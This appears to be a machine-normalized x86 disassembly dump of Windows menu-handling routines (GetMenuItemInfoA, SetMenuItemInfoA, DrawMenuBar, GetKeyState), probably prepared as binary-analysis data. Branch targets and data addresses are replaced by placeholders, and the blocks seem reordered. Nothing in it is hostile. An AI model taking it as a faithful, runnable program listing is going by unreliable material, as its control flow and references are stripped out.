jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_45f5b4
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_40432c
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_45ff80
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_45f5b4
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45f5b4
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403190
mov eax [ ebp - 0x20 ]
call sub_403190
mov eax [ ebp - 0x14 ]
call sub_403190
mov eax [ ebp - 0xc ]
call sub_403190
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_45ff80
pop ecx
mov eax [ ebp - 0x30 ]
call sub_4041e0
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_45f5b4
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_46205c
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407d04
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_403f74
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c4c8
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40c4c8
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_45f5b4
push eax
mov edx esi
mov eax ebx
call sub_45f5b4
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_404440
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407d04
push ebp
mov eax [ ebp - 0x2c ]
call sub_45ff50
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_45ff50
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c4c8
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_403fb8
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45f5b4
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_45f5b4
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_461fc8
mov edx [ ebp - 0x40 ]
pop eax
call sub_403f74
mov edx esi
mov eax ebx
call sub_45f5b4
push eax
mov edx esi
mov eax ebx
call sub_45f5b4
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_4041e0
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_404440
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_460004
mov eax [ ebp - 0x18 ]
call sub_4041e0
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_404480
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_4044c8
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_460004
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_460660
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_45f5a4
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_45f5a4
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4607e4
test al al
je r-xdata
mov eax esi
call sub_45f5a4
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_45f5b4
call sub_46063c
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_45f5b4
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_45f5b4
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_45f5b4
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_45f5b4
call sub_46063c
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_45f5b4
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_45f5b4
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_45f5b4
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_45f5b4
call sub_46063c
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_4607b8
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_4607b8
and eax 0x7f
mov al [ eax + rw-data ]
sub_4607e4
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_4607e4
and eax 0x7f
mov al [ eax + rw-data ]
sub_460810
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45d4f8
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_420754
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_46153c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_4608ac
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_403190
mov eax [ esi + 0x44 ]
call sub_403190
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4207a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_460920
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_460920
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_45d064
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_45f9a8
mov eax ebx
pop esi
pop ebx
retn
sub_460960
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_45f5a4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_45f5b4
call sub_460960
pop ecx
test al al
je r-xdata
sub_4609f8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_460960
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_45d064
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_460a28
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_4609f8
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_461d4c
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_460a98
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_4609f8
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_460ab4
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_4609f8
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_460164
mov ebx eax
xor edx edx
mov eax edi
call sub_460660
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_45facc
mov eax [ esi + 0x34 ]
call sub_45facc
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_45da08
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_453a88
push eax
call DrawMenuBar
sub_460ba0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_460ba0
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push j_sub_403670#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_4609f8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_45facc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_460b90
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_460cf4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_42ab20
xor eax eax
push ebp
push sub_460df2
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_42ab20
xor eax eax
push ebp
push sub_460dc7
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_460ba0
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_42ab18
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460df9
mov eax [ rw-data ]
call sub_42ab18
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_4609f8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_460e18
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_46119c
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_46119c
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_460ed4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_461470
mov eax ebx
call sub_4086bc
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_460f74
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_460ed4
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_404190
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_4043e0
lea edx [ ebp - 0x200 ]
call sub_408780
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_461008
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_461078
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_461518
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_461518
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_461518
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_461084
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_460f74
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_461008
mov eax ebx
call sub_46153c
jmp r-xdata
sub_4610ec
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_461134
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_45b364
mov eax ebx
call sub_460948
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_45b3a8
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_420824
sub_461170
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_420a70
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_461134
sub_4611b4
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_4609f8
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_4609f8
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_4644a8
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_461210
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_4612e5
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_4609f8
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_4609f8
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_45f5a4
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45f5b4
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_404108
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_404108
mov eax [ ebp - 0xc ]
pop edx
call sub_407ee4
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_46205c
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4612ec
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403f44
retn
sub_4612f8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_4611b4
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
